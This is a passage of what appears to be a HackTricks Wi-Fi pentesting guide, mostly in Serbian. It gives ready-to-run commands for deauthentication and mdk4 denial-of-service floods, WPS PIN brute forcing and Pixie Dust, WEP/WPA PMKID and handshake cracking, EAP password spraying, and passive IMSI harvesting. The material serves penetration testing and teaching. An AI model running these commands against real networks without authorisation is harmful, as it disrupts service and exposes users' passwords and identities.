# Pentesting Wifi

{{#include ../../banners/hacktricks-training.md}}

## Wifi osnovne komande
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
airodump-ng wlan0mon --wps #Scan WPS
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
iwlist wlan0 scan #Scan available wifis
```
## Alati

### Hijacker & NexMon (interni Wi-Fi na Androidu)


{{#ref}}
enable-nexmon-monitor-and-injection-on-android.md
{{#endref}}

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**Pokrenite airgeddon koristeći docker**
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
From: [https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux](https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux)

### wifiphisher

Može izvesti Evil Twin, KARMA i Known Beacons napade, a zatim koristiti phishing template da bi pribavio stvarnu lozinku mreže ili ukrao pristupne podatke društvenih mreža.
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

Ovaj alat automatizuje **WPS/WEP/WPA-PSK** napade. Automatski će:

- Postaviti interfejs u monitor mode
- Skenirati moguće mreže - i dozvoliti ti da izabereš victim(s)
- Ako je WEP - Pokrenuti WEP napade
- Ako je WPA-PSK
- Ako je WPS: Pixie dust attack i bruteforce attack (pazi, brute-force attack može potrajati dugo). Imaj na umu da ne pokušava null PIN ili database/generated PINs.
- Pokušati da uhvati PMKID sa AP-a kako bi ga crackovao
- Pokušati da deauthenticate klijente AP-a kako bi uhvatio handshake
- Ako PMKID ili Handshake, pokušati da bruteforce-uje koristeći top5000 passwords.

## Sažetak napada

- **DoS**
- Deauthentication/disassociation -- Disconnect everyone (or a specific ESSID/Client)
- Random fake APs -- Sakriti mreže, moguće oboriti skenere
- Overload AP -- Pokušati da oboriš AP (obično nije naročito korisno)
- WIDS -- Igrati se sa IDS-om
- TKIP, EAPOL -- Neki specifični napadi za DoS nekih AP-ova
- **Cracking**
- Crack **WEP** (više alata i metoda)
- **WPA-PSK**
- **WPS** pin "Brute-Force"
- **WPA PMKID** bruteforce
- \[DoS +] **WPA handshake** capture + Cracking
- **WPA-MGT**
- **Username capture**
- **Bruteforce** Credentials
- **Evil Twin** (with or without DoS)
- **Open** Evil Twin \[+ DoS] -- Korisno za hvatanje captive portal creds i/ili izvođenje LAN napada
- **WPA-PSK** Evil Twin -- Korisno za mrežne napade ako znaš lozinku
- **WPA-MGT** -- Korisno za hvatanje company credentials
- **KARMA, MANA**, **Loud MANA**, **Known beacon**
- **+ Open** -- Korisno za hvatanje captive portal creds i/ili izvođenje LAN napada
- **+ WPA** -- Korisno za hvatanje WPA handshakes

## Brze beleške o Open / OWE mrežama

- **Passive capture** na otvorenim SSID-ovima i dalje radi sa monitor mode i tcpdump:
```bash
iw wlan0 set type monitor
ip link set wlan0 up
iw wlan0 set channel 6
tcpdump -i wlan0 -w capture.pcap
```
- **OWE** (Opportunistic Wireless Encryption) performs a per-station key exchange (no PSK), so air frames are encrypted even on "open" SSIDs. Being WPA3-based, it also enforces **802.11w PMF**, which blocks spoofed deauth/disassoc frames.
- OWE **does not authenticate** joiners: anyone can associate, so **verify client isolation** instead of trusting marketing claims. Without isolation, ARP spoofing or responder-style poisoning on the local L2 still works.
- **Evil Twin** remains feasible on open/OWE SSIDs by presenting a stronger signal; PMF just removes the deauth shortcut. If victims accept a forged TLS cert, full HTTP(S) MitM is regained.
- Broadcast poisoning on open guest Wi-Fi easily yields creds/hashes (LLMNR/NBT-NS/mDNS). See:

{{#ref}}
../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## DOS

### Deauthentication Packets

**Opis iz** [**here**:](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

**Deauthentication** napadi, raširen metod u Wi-Fi hakovanju, podrazumevaju falsifikovanje "management" frames kako bi se **silom isključili uređaji sa mreže**. Ovi nešifrovani paketi obmanjuju klijente da poveruju da potiču od legitimne mreže, omogućavajući napadačima da prikupe WPA handshakes radi krckanja ili da uporno ometaju mrežne veze. Ova taktika, alarmantna u svojoj jednostavnosti, široko se koristi i ima značajne implikacije po sigurnost mreže.

**Deauthentication using Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
- -0 znači deauthentication
- 1 je broj deauths koje treba poslati (možete poslati više ako želite); 0 znači slati ih kontinuirano
- -a 00:14:6C:7E:40:80 je MAC address access point-a
- -c 00:0F:B5:34:30:30 je MAC address klijenta koji treba deauthenticate; ako je ovo izostavljeno, šalje se broadcast deauthentication (ne radi uvek)
- ath0 je interface name

### Disassociation Packets

**Disassociation packets**, slični deauthentication packets, su tip management frame koji se koristi u Wi‑Fi mrežama. Ovi paketi služe da prekinu vezu između uređaja (na primer laptop ili smartphone) i access point-a (AP). Osnovna razlika između disassociation i deauthentication leži u scenarijima upotrebe. Dok AP emituje **deauthentication packets to remove rogue devices explicitly from the network, disassociation packets are typically sent when the AP is undergoing a shutdown**, restart, or relocating, thereby necessitating the disconnection of all connected nodes.

**Ovaj napad se može izvesti pomoću mdk4(mode "d"):**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **Više DOS napada od mdk4**

**Vidi** [**here**](https://en.kali.tools/?p=864)**.**

**ATTACK MODE b: Beacon Flooding**

Šalje beacon frames kako bi prikazao lažne APs klijentima. Ovo ponekad može srušiti network scanners, pa čak i drivers!
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**ATTACK MODE a: Authentication Denial-Of-Service**

Slanje authentication frames svim dostupnim Access Points (APs) u dometu može preopteretiti te APs, naročito kada je uključen veliki broj clients. Ovaj intenzivan saobraćaj može dovesti do nestabilnosti sistema, zbog čega se neki APs mogu zamrznuti ili čak resetovati.
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**ATTACK MODE p: SSID Probing and Bruteforcing**

Probing Access Points (APs) proverava da li je SSID pravilno otkriven i potvrđuje domet AP-a. Ova tehnika, u kombinaciji sa **bruteforcing hidden SSIDs** sa ili bez wordlist, pomaže u identifikaciji i pristupu skrivenim mrežama.

**ATTACK MODE m: Michael Countermeasures Exploitation**

Slanje nasumičnih ili dupliciranih paketa u različite QoS redove može pokrenuti Michael Countermeasures na **TKIP APs**, što dovodi do jednominutnog gašenja AP-a. Ova metoda je efikasna taktika **DoS** (Denial of Service) napada.
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**ATTACK MODE e: EAPOL Start and Logoff Packet Injection**

Poplava AP-a sa **EAPOL Start frames** stvara **fake sessions**, preopterećujući AP i blokirajući legitimne klijente. Alternativno, injektovanje **fake EAPOL Logoff messages** prinudno prekida veze klijenata; obe metode efikasno ometaju mrežnu uslugu.
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**ATTACK MODE s: Napadi na IEEE 802.11s mesh mreže**

Razni napadi na upravljanje linkovima i rutiranje u mesh mrežama.

**ATTACK MODE w: WIDS Confusion**

Povezivanje klijenata na više WDS čvorova ili lažnih rogue APs može manipulirati Intrusion Detection and Prevention Systems, izazivajući zabunu i potencijalnu zloupotrebu sistema.
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**ATTACK MODE f: Packet Fuzzer**

Packet fuzzer koji nudi različite izvore paketa i sveobuhvatan skup modifikatora za manipulaciju paketima.

### **Airggedon**

_**Airgeddon**_ nudi većinu napada pomenutih u prethodnim komentarima:

![](<../../images/image (95).png>)

## WPS

WPS (Wi‑Fi Protected Setup) pojednostavljuje proces povezivanja uređaja na ruter, ubrzavajući i olakšavajući podešavanje za mreže šifrovane sa **WPA** ili **WPA2** Personal. Neefikasan je protiv lako kompromitovane WEP bezbednosti. WPS koristi 8‑cifreni PIN, validiran u dve polovine, što ga čini podložnim brute-force napadima zbog ograničenog broja kombinacija (oko 11.000 mogućnosti).

### WPS Bruteforce

Postoje 2 glavna alata za izvođenje ove akcije: Reaver i Bully.

- **Reaver** je dizajniran da bude robusni i praktični alat za napad na WPS, i testiran je na širokom spektru access point-ova i WPS implementacija.
- **Bully** je **nova implementacija** WPS brute force napada, napisana u C. Ima nekoliko prednosti u odnosu na originalni reaver kod: manje zavisnosti, poboljšane performanse memorije i CPU-a, ispravno rukovanje endianness-om i robusniji skup opcija.

Napad iskorišćava ranjivost **WPS PIN-a**, naročito izlaganje prvih četiri cifre i ulogu poslednje cifre kao checksum-a, što olakšava brute-force napad. Međutim, odbrana od brute-force napada, kao što je **blokiranje MAC adresa** agresivnih napadača, zahteva **MAC address rotation** da bi se napad nastavio.

Nakon dobijanja WPS PIN-a pomoću alata kao što su Bully ili Reaver, napadač može izračunati WPA/WPA2 PSK, obezbeđujući **trajni pristup mreži**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Smart Brute Force**

Ovaj rafinirani pristup cilja WPS PINs koristeći poznate ranjivosti:

1. **Prethodno otkriveni PINs**: Iskoristite bazu poznatih PINs povezanih sa određenim proizvođačima koji su poznati po korišćenju uniformnih WPS PINs. Ova baza povezuje prva tri okteta MAC-addresses sa verovatnim PINs za te proizvođače.
2. **Algoritmi za generisanje PINs**: Iskoristite algoritme poput ComputePIN i EasyBox, koji računaju WPS PINs na osnovu MAC-address-a AP-a. Arcadyan algoritam dodatno zahteva device ID, dodajući sloj procesu generisanja PINs.

### WPS Pixie Dust attack

**Dominique Bongard** je otkrio propust u nekim Access Points (APs) u vezi stvaranja tajnih kodova, poznatih kao **nonces** (**E-S1** i **E-S2**). Ako se ovi nonces mogu otkriti, probijanje AP-ovog WPS PIN postaje lako. AP otkriva PIN unutar posebnog koda (hash) kako bi dokazao da je legitimno, a ne lažno (rogue) AP. Ovi nonces su ustvari "ključevi" za otključavanje "sefa" koji čuva WPS PIN. Više o ovome može se naći [ovde](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>).

Jednostavno rečeno, problem je u tome što neki APs nisu koristili dovoljno nasumične ključeve za enkripciju PIN-a tokom procesa povezivanja. To čini PIN ranjivim na pogađanje spolja iz mreže (offline brute force attack).
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
Ako ne želite da prebacite uređaj u monitor mode, ili ako `reaver` i `bully` imaju neki problem, možete probati [OneShot-C](https://github.com/nikita-yfh/OneShot-C). Ovaj alat može da izvede Pixie Dust attack bez potrebe za prebacivanjem u monitor mode.
```bash
./oneshot -i wlan0 -K -b 00:C0:CA:78:B1:37
```
### Null Pin attack

Neki loše dizajnirani sistemi čak dozvoljavaju da **Null PIN** (prazan ili nepostojeći PIN) omogući pristup, što je prilično neobično. Alat **Reaver** može testirati ovu ranjivost, za razliku od **Bully**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

Sve predložene WPS napade je lako izvesti koristeći _**airgeddon.**_

![](<../../images/image (219).png>)

- 5 i 6 omogućavaju da isprobate **vaš prilagođeni PIN** (ako ga imate)
- 7 i 8 izvode **Pixie Dust attack**
- 13 vam omogućava da testirate **NULL PIN**
- 11 i 12 će **prikupiti PIN-ove vezane za izabrani AP iz dostupnih baza podataka** i **generisati** moguće **PIN-ove** koristeći: ComputePIN, EasyBox i opciono Arcadyan (preporučeno, zašto ne?)
- 9 i 10 će testirati **svaki mogući PIN**

## **WEP**

**Zašto se lomi**

- RC4 seed is just **IV (24 bits) + shared key**. The IV is cleartext, tiny (2^24), and repeats quickly, so ciphertexts with the same IV reuse the keystream.
- XORing two ciphertexts with the same keystream leaks `PlaintextA ⊕ PlaintextB`; predictable headers + RC4 KSA biases (**FMS**) let you “glasate” key bytes. **PTW** optimises this using ARP traffic to drop requirements to tens of thousands of packets instead of millions.
- Integrity is only **CRC32** (linear/unkeyed), so an attacker can flip bits and recompute CRC32 without the key → packet forgery/replay/ARP injection while waiting for IVs.

Praktično slamanje je determinističko:
```bash
airodump-ng --bssid <BSSID> --channel <ch> --write wep_capture wlan1mon  # collect IVs
# optionally speed up IVs without deauth by replaying ARP
aireplay-ng --arpreplay -b <BSSID> -h <clientMAC> wlan1mon
aircrack-ng wep_capture-01.cap  # PTW attack recovers key once IV threshold is met
```
Airgeddon i dalje uključuje "All-in-One" WEP workflow ako više volite vođeni UI.

![](<../../images/image (432).png>)

---

---

## WPA/WPA2 PSK

### PMKID

In 2018, **hashcat** [revealed](https://hashcat.net/forum/thread-7717.html) a new attack method, unique because it only needs **one single packet** and doesn't require any clients to be connected to the target AP—just interaction between the attacker and the AP.

Mnogi moderni ruteri dodaju **opcionalno polje** u **prvi EAPOL** frame tokom asocijacije, poznato kao `Robust Security Network`. Ovo uključuje `PMKID`.

Kao što originalni post objašnjava, **PMKID** se kreira koristeći poznate podatke:
```bash
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
Pošto je "PMK Name" konstantan, znamo BSSID AP-a i stanice, a `PMK` je identičan onom iz full 4-way handshake, **hashcat** može iskoristiti ove informacije da crack-uje PSK i povrati passphrase!

Da biste **prikupili** ove informacije i lokalno **bruteforce** lozinku, možete uraditi:
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
**PMKIDs captured** će biti prikazani u **console** i takođe **sačuvani** unutar \_ **/tmp/attack.pcap**\_\
Sada konvertuj capture u **hashcat/john** format i crack it:
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Obratite pažnju da format ispravnog hasha sadrži **4 dela**, kao na primer: `4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7566f6461666f6e65436f6e6e6563743034383131343838` Ako vaš **samo** sadrži **3 dela**, onda je **neispravan** (the PMKID capture wasn't valid).

Imajte na umu da `hcxdumptool` **takođe capture handshakes** (pojaviće se nešto ovako: **`MP:M1M2 RC:63258 EAPOLTIME:17091`**). Možete **pretvoriti** **handshakes** u **hashcat**/**john** format koristeći `cap2hccapx`
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_Primetio sam da neki handshakes snimljeni ovim alatom nisu mogli biti cracked čak i kada je tačan password poznat. Preporučujem da, ako je moguće, handshakes takođe snimite na tradicionalan način, ili uhvatite više njih koristeći ovaj alat._

### Handshake capture

Napad na **WPA/WPA2** mreže može se izvesti hvatanjem **handshake** i pokušajem da se **crack** password **offline**. Ovaj proces podrazumeva nadgledanje komunikacije određene mreže i **BSSID** na određenom **channel**. Evo pojednostavljenog vodiča:

1. Identifikujte **BSSID**, **channel**, i **connected client** ciljane mreže.
2. Koristite `airodump-ng` za nadgledanje saobraćaja mreže na navedenom channel-u i BSSID-u, u nadi da ćete uhvatiti handshake. Komanda će izgledati ovako:
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
3. Da biste povećali šansu da uhvatite handshake, na kratko prekinite vezu klijenta sa mrežom kako biste ga primorali na ponovnu autentifikaciju. Ovo se može uraditi koristeći komandu `aireplay-ng`, koja šalje deauthentication packets klijentu:
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, may not work in all scenarios
```
_Imajte na umu da, pošto je client bio deauthenticated, mogao je pokušati da se poveže na drugi AP ili, u drugim slučajevima, na drugu mrežu._

Kada se u `airodump-ng` pojave neke handshake informacije, to znači da je handshake uhvaćen i možete prestati sa slušanjem:

![](<../../images/image (172) (1).png>)

Kada je handshake uhvaćen, možete ga **crack**-ovati pomoću `aircrack-ng`:
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### Proveri da li je handshake u fajlu

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_Ako ovaj alat pronađe nepotpuni handshake za ESSID pre nego što pronađe kompletan, neće detektovati važeći handshake._

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
#### Brže online pogađanje PSK preko `wpa_supplicant` ctrl socket (no clients/PMKID)

Kada nema klijenata i AP odbija PMKID, možete iterativno isprobavati PSKs online bez respawn-ovanja supplicants:

- Patch `wpa_supplicant.c` da forsirate `dur = 0;` u auth failure backoff logici (oko `ssid->auth_failures`), čime se efektivno onemogućava temporary-disable timer.
- Pokrenite jedan daemon sa control socket-om:
```bash
# wpa_supplicant.conf
ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=root
update_config=1

wpa_supplicant -B -i wlp3s0 -c wpa_supplicant.conf
```
- Upravljajte njime putem kontrolnog interfejsa, ponovo koristeći isti scan i network:
```text
ADD_NETWORK
SET_NETWORK 0 ssid "<ssid>"
ENABLE_NETWORK 0
SCAN
(loop)
SET_NETWORK 0 psk "<candidate>"
REASSOCIATE
wait for CTRL-EVENT-CONNECTED / DISCONNECTED
```
Mali Python loop koji čita socket događaje (`CTRL-EVENT-CONNECTED` / `CTRL-EVENT-DISCONNECTED`) može testirati ~100 pokušaja za ~5 minuta bez scan overhead. I dalje je bučno i detektabilno, ali izbegava restartove procesa po pokušaju i backoff kašnjenja.

## **WPA Enterprise (MGT)**

U **enterprise WiFi okruženjima naići ćete na različite metode autentifikacije**, svaka pruža različite nivoe bezbednosti i mogućnosti upravljanja. Kada koristite alate poput `airodump-ng` za pregled mrežnog saobraćaja, možete primetiti identifikatore za ove tipove autentifikacije. Neke uobičajene metode uključuju:
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
1. **EAP-GTC (Generic Token Card)**:
- Ova metoda podržava hardware tokens i one-time passwords unutar EAP-PEAP. Za razliku od MSCHAPv2, ne koristi peer challenge i šalje lozinke u plaintext do access point-a, što predstavlja rizik od downgrade attacks.
2. **EAP-MD5 (Message Digest 5)**:
- Podrazumeva slanje MD5 heša lozinke sa klijenta. Nije **preporučljivo** zbog ranjivosti na dictionary attacks, nedostatka server authentication i nemogućnosti generisanja session-specific WEP keys.
3. **EAP-TLS (Transport Layer Security)**:
- Koristi client-side i server-side certificates za autentikaciju i može dinamički generisati user-based i session-based WEP keys za zaštitu komunikacije.
4. **EAP-TTLS (Tunneled Transport Layer Security)**:
- Pruža mutual authentication kroz encrypted tunnel, zajedno sa metodom za izvlačenje dinamičkih, per-user, per-session WEP keys. Zahteva samo server-side certificates, dok klijenti koriste credentials.
5. **PEAP (Protected Extensible Authentication Protocol)**:
- Radi slično EAP-u kreiranjem TLS tunela za zaštićenu komunikaciju. Omogućava korišćenje slabijih authentication protokola iznad EAP zbog zaštite koju tunel pruža.
- **PEAP-MSCHAPv2**: Često se naziva PEAP; kombinuje ranjivi MSCHAPv2 challenge/response mehanizam sa zaštitnim TLS tunnelom.
- **PEAP-EAP-TLS (or PEAP-TLS)**: Slično EAP-TLS ali inicira TLS tunel pre razmene sertifikata, nudeći dodatni sloj zaštite.

Više informacija o ovim authentication metodama možete naći [here ](https://en.wikipedia.org/wiki/Extensible_Authentication_Protocol)and [here](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html).

### Username Capture

Čitajući [https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27) deluje da ako koristite **EAP** onda **"Identity"** **messages** moraju biti podržani, i **username** će biti poslat u **clear** u **"Response Identity"** messages.

Čak i koristeći jedan od najsigurnijih authentication metoda: **PEAP-EAP-TLS**, moguće je **capture the username sent in the EAP protocol**. Da biste to uradili, capture-ujte authentication komunikaciju (start `airodump-ng` inside a channel i `wireshark` u istom interfejsu) i filtrirajte pakete po `eapol`.\
Unutar "**Response, Identity**" paketa, pojaviće se **username** klijenta.

![](<../../images/image (850).png>)

### Anonymous Identities

Sakrivanje identity je podržano i od strane EAP-PEAP i EAP-TTLS. U kontekstu WiFi mreže, EAP-Identity request obično pokreće access point (AP) tokom association procesa. Da bi se osigurala zaštita anonymity korisnika, odgovor EAP klijenta na korisnikovom uređaju sadrži samo esencijalne informacije potrebne inicijalnom RADIUS serveru da obradi zahtev. Ovo je ilustrovano kroz sledeće scenarije:

- EAP-Identity = anonymous
- U ovom scenariju, svi korisnici koriste pseudonim "anonymous" kao svoj user identifier. Inicijalni RADIUS server funkcioniše kao EAP-PEAP ili EAP-TTLS server, zadužen za rukovođenje server-side dela PEAP ili TTLS protokola. Inner (protected) authentication metoda se onda ili lokalno obrađuje ili delegira remote (home) RADIUS serveru.
- EAP-Identity = anonymous@realm_x
- U ovoj situaciji, korisnici iz različitih realm-ova skrivaju svoje identitete dok ukazuju na svoje odgovarajuće realm-ove. Ovo omogućava inicijalnom RADIUS serveru da proxy-uje EAP-PEAP ili EAP-TTLS zahteve ka RADIUS serverima u njihovim home realm-ovima, koji deluju kao PEAP ili TTLS server. Inicijalni RADIUS server funkcioniše isključivo kao RADIUS relay node.
- Alternativno, inicijalni RADIUS server može funkcionisati kao EAP-PEAP ili EAP-TTLS server i ili obrađivati protected authentication metodu ili je proslediti drugom serveru. Ova opcija omogućava konfigurisanje različitih politika za različite realm-ove.

U EAP-PEAP, nakon što je TLS tunnel uspostavljen između PEAP servera i PEAP klijenta, PEAP server inicira EAP-Identity request i prenosi ga kroz TLS tunnel. Klijent odgovara na ovaj drugi EAP-Identity request slanjem EAP-Identity response koji sadrži stvarni identity korisnika kroz encrypted tunnel. Ovaj pristup efikasno sprečava otkrivanje stvarnog identiteta korisnika svima koji presreću 802.11 saobraćaj.

EAP-TTLS sledi blago drugačiju proceduru. Kod EAP-TTLS, klijent tipično autentifikuje koristeći PAP ili CHAP, osigurano TLS tunnel-om. U tom slučaju, klijent uključuje User-Name atribut i ili Password ili CHAP-Password atribut u inicijalnu TLS poruku poslatu nakon uspostavljanja tunela.

Bez obzira na izabrani protokol, PEAP/TTLS server saznaje stvarni identity korisnika tek nakon uspostavljanja TLS tunela. Stvarni identity može biti predstavljen kao user@realm ili jednostavno user. Ako PEAP/TTLS server takođe vrši autentikaciju korisnika, sada poseduje korisnikov identity i nastavlja sa authentication metodom zaštićenom TLS tunelom. Alternativno, PEAP/TTLS server može proslediti novi RADIUS zahtev korisnikovom home RADIUS serveru. Ovaj novi RADIUS zahtev izostavlja PEAP ili TTLS protocol layer. U slučajevima kada je protected authentication metoda EAP, inner EAP poruke se prenose home RADIUS serveru bez EAP-PEAP ili EAP-TTLS wrapper-a. User-Name atribut izlazne RADIUS poruke sadrži stvarni identity korisnika, zamenjujući anonymous User-Name iz dolaznog RADIUS zahteva. Kada je protected authentication metoda PAP ili CHAP (podržano samo od strane TTLS), User-Name i ostali authentication atributi izvučeni iz TLS payload-a zamenjuju se u izlaznoj RADIUS poruci, zamenjujući anonymous User-Name i TTLS EAP-Message atribute iz dolaznog RADIUS zahteva.

Za više informacija pogledajte [https://www.interlinknetworks.com/app_notes/eap-peap.htm](https://www.interlinknetworks.com/app_notes/eap-peap.htm)

### SIM-based EAP (EAP-SIM/EAP-AKA) identity leakage (IMSI exposure)

SIM-based Wi‑Fi authentication using EAP‑SIM/EAP‑AKA over 802.1X can leak the permanent subscriber identifier (IMSI) in cleartext during the unauthenticated identity phase if the deployment doesn’t implement pseudonyms/protected identities or a TLS tunnel around the inner EAP.

Where the leak happens (high level):
- 802.11 association completes to the SSID (often carrier offload SSIDs like FreeWifi_secure, eduroam-like operator realms, etc.).
- Authenticator sends EAP-Request/Identity.
- Vulnerable clients answer EAP-Response/Identity with their permanent identity = IMSI encoded as a 3GPP NAI, prior to any protection.
- Example NAI: 20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
- Anyone passively listening to RF can read that frame. No 4-way handshake or TLS keying is needed.

Quick PoC: passive IMSI harvesting on EAP‑SIM/AKA networks lacking identity privacy
<details>
<summary>Kliknite za proširenje</summary>
```bash
# 1) Enable monitor mode
airmon-ng start wlan0

# 2) Optional: lock channel to the target BSS
airodump-ng wlan0mon --essid <SSID>

# 3) Capture 802.1X/EAP frames
# Wireshark display filters:
#   eap || eapol
#   (identity specifically): eap.code == 2 && eap.type == 1
# Kismet: add source wlan0mon; enable 802.1X/EAP views
# tcpdump (pcap capture):
#   tcpdump -i wlan0mon -s 0 -w eapsim_identity.pcap

# 4) Wait for a device to auto-connect to the SSID
# 5) Inspect the first EAP-Response/Identity frame
# Expected: ASCII NAI containing IMSI, e.g.
#   20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
```
</details>

Napomene:
- Radi pre bilo kog TLS tunela ako deployment koristi gol EAP‑SIM/AKA bez zaštićenog identiteta/pseudonima.
- Izložena vrednost je trajni identifikator vezan za SIM pretplatnika; njegovo sakupljanje omogućava dugoročno praćenje i naknadne zloupotrebe u telekomunikacijama.

Uticaj
- Privatnost: trajno praćenje korisnika/uređaja iz pasivnih Wi‑Fi presretanja na javnim mestima.
- Početna tačka za zloupotrebe u telekomu: sa IMSI, napadač sa pristupom SS7/Diameter može da upituje lokaciju ili pokuša presretanje poziva/SMS i krađu MFA.

Ublažavanja / na šta obratiti pažnju
- Potvrdite da klijenti koriste anonimne spoljne identitete (pseudonime) za EAP‑SIM/AKA u skladu sa 3GPP smernicama (npr. 3GPP TS 33.402).
- Preferirajte tunelovanje faze identiteta (npr. EAP‑TTLS/PEAP koji nosi unutrašnji EAP‑SIM/AKA) tako da IMSI nikada nije poslat u čistom tekstu.
- Snimci paketa prilikom association/auth nikada ne bi trebalo da otkriju sirovi IMSI u EAP-Response/Identity.

Related: Telecom signalling exploitation with captured mobile identifiers
{{#ref}}
../pentesting-network/telecom-network-exploitation.md
{{#endref}}

### EAP-Bruteforce (password spray)

If the client is expected to use a **username and password** (notice that **EAP-TLS won't be valid** in this case), then you could try to get a **list** a **usernames** (see next part) and **passwords** and try to **bruteforce** the access using [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer)**.**
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
Takođe možete izvesti ovaj napad koristeći `eaphammer`:
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## Teorija napada na klijente

### Izbor mreže i roaming

- Protokol 802.11 definiše kako stanica pristupa Extended Service Set (ESS) ali ne navodi kriterijume za izbor ESS-a ili access point-a (AP) unutar njega.
- Stanice mogu da se kreću (roam) između AP-ova koji dele isti ESSID, održavajući konekciju kroz zgradu ili područje.
- Protokol zahteva autentikaciju stanice prema ESS-u, ali ne nalaže autentikaciju AP-a prema stanici.

### Preferisane liste mreža (PNL)

